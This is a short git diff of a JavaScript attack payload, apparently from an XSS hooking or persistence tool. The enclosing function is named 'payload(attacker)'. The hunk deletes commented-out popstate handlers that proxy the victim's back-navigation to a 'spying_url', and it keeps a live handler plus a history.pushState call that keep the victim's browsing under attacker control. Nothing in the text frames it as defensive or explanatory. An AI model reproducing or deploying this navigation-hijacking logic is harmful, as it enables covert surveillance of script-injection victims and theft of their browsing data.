@@ -30,20 +30,6 @@ function payload(attacker) {
                 if (shouldPush) {
                     history.pushState(null, document.title, href)
                 }
-
-                // $(window).one('popstate', function(e) {
-                //     e.preventDefault();
-                //     var backLink = e.target.location.href;
-                //     proxy(backLink, spying_url);
-                // })
-
-                // addEventListener('popstate', function(e) {
-                //     e.preventDefault();
-                //     var backLink = e.target.location.href;
-                //     proxy(backLink, spying_url);
-                // }, {
-                //     once: true
-                // });
                 
                 window.onpopstate = function(e) {
                     e.preventDefault();
